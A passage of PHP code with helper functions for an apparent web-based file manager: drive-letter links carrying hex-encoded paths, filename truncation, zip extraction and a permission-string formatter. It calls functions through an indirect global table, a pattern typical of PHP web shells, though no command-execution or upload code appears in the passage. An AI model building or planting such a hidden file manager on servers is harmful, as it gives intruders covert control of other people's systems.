        'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'V', 'W', 'X', 'Y', 'Z'
    ];
    foreach ($winArr as $winNum => $winVal) {
        if (is_dir($winVal . ":/")) {
            echo "<a style='color:orange; font-weight:bold;' href='?d=" . hx($winVal . ":/") . "'>[ " . $winVal . " ] </a>&nbsp;";
        }
    }
}

function namaPanjang($value)
{
    $namaNya = $value;
    $extensi = pathinfo($value, PATHINFO_EXTENSION);
    if (strlen($namaNya) > 30) {
        return substr($namaNya, 0, 30) . "...";
    } else {
        return $value;
    }
}

function extractArchive($archiveFilename, $extractPath)
{
    $zip = new ZipArchive();

    if ($zip->open($archiveFilename) === TRUE) {
        $zip->extractTo($extractPath);
        $zip->close();
        return true;
    } else {
        return false;
    }
}

function perms($file)
{
    $perms = $GLOBALS['fungsi'][6]($file);
    if (($perms & 0xC000) == 0xC000) {
        // Socket
        $info = 's';
    } elseif (($perms & 0xA000) == 0xA000) {
        // Symbolic Link
        $info = 'l';
    } elseif (($perms & 0x8000) == 0x8000) {
        // Regular
        $info = '-';
    } elseif (($perms & 0x6000) == 0x6000) {
        // Block special
        $info = 'b';
    } elseif (($perms & 0x4000) == 0x4000) {
        // Directory
        $info = 'd';
    } elseif (($perms & 0x2000) == 0x2000) {
        // Character special
        $info = 'c';
    } elseif (($perms & 0x1000) == 0x1000) {
        // FIFO pipe
        $info = 'p';
    } else {
        // Unknown
        $info = 'u';
    }
    // Owner
    $info .= (($perms & 0x0100) ? 'r' : '-');
    $info .= (($perms & 0x0080) ? 'w' : '-');
    $info .= (($perms & 0x0040) ?
        (($perms & 0x0800) ? 's' : 'x') : (($perms & 0x0800) ? 'S' : '-'));
    // Group
    $info .= (($perms & 0x0020) ? 'r' : '-');
    $info .= (($perms & 0x0010) ? 'w' : '-');
    $info .= (($perms & 0x0008) ?
        (($perms & 0x0400) ? 's' : 'x') : (($perms & 0x0400) ? 'S' : '-'));

    // World
    $info .= (($perms & 0x0004) ? 'r' : '-');
    $info .= (($perms & 0x0002) ? 'w' : '-');
    $info .= (($perms & 0x0001) ?
        (($perms & 0x0200) ? 't' : 'x') : (($perms & 0x0200) ? 'T' : '-'));
    return $info;
}
?>
